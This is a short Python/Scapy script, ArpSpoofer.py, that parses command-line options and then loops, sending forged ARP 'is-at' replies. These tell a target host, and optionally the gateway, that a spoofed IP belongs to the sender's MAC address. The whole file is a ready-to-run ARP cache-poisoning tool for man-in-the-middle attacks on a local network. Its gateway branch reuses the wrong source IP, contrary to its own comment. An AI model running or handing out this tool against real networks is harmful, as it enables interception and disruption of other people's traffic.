from scapy.all import *
from scapy.layers.l2 import arpcachepoison, Ether, ARP, getmacbyip
import sys
from time import sleep

# interface, sourceIP, targetIP, delay, gw

# region Arguments

argv = sys.argv
args = len(argv)
i = 1
targetIP = ''  #                     |
sourceIP = gwaddr = conf.route.route('0.0.0.0')[2] # |
interface = conf.iface  #            | Default values
delay = 0  #                         |
gw = False  #                        |
while i < args or args == 1:  # A while loop to iterate on all parameters.
    if args == 1 or sys.argv[i] in ('-h', '--help'):
        print("usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET\n\n"
              "Spoof ARP tables\n\noptional arguments:\n"
              "-h, --help     show this help message and exit\n"
              "-i IFACE, --iface IFACE      Interface you wish to use (default is your computer's default)\n"
              "-s SRC, --src SRC The address you want for the attacker\n"
              "-d DELAY, --delay DELAY    Delay (in seconds) between messages\n"
              "-gw        should GW be attacked as well"
              "-t TARGET, --target TARGET     IP of target")
        exit(0);

    elif argv[i] in ('-i', '--iface'):
        interface = sys.argv[i + 1]
        i += 1

    elif argv[i] in ('-t', '--target'):
        targetIP = (sys.argv[i + 1])
        i += 1

    elif argv[i] in ('-s', '--src'):
        sourceIP = (sys.argv[i + 1])
        i += 1

    elif argv[i] in ('-d', '--delay'):
        delay = (sys.argv[i + 1])
        i += 1

    elif argv[i] in '-gw':
        gw = True

    else:
        print("%s isn't an option." % (argv[i]))
    i += 1
# endregion


gwaddr = conf.route.route('0.0.0.0')[2]  # Should return the gateway

try:
    while True:
        print("Sending packet to target.") # Tell the target that sourceIP is at our MAC
        p = ARP(op="is-at", psrc=sourceIP, pdst=targetIP, hwsrc=get_if_hwaddr(interface))#make packet
        send(p, iface=interface)#send attack
        if gw:
            print("Sending packet to gateway.") # Tell the source IP that targetIP is at our MAC
            p = ARP(op="is-at", psrc=sourceIP, pdst=gwaddr, hwsrc=get_if_hwaddr(interface))
            send(p, iface=interface)

        sleep(int(delay))#delay
except KeyboardInterrupt:
    print("\nInterrupted - Finishing.")
# sourceMAC=attacker`s MAC, psrc= which IP to update, pdst=where to send reply,
# hwsrc = what mac is associated with psrc. hwdst = MAC of pdst